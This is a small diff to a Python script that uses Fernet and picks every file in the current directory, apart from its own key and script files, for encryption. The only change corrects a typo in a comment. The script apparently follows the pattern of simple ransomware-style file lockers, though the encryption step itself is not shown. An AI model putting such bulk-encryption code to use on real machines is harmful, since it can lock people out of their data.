@@ -4,7 +4,7 @@ from cryptography.fernet import Fernet
 protected_files = ["encrypt.py","decrypt.py","encryption_key.key","venv"]
 target_files=list()
 
-# Determing the files to encrypt.
+# Determining the files to encrypt.
 for file in os.listdir():
 	if file not in protected_files:
 		target_files.append(file)
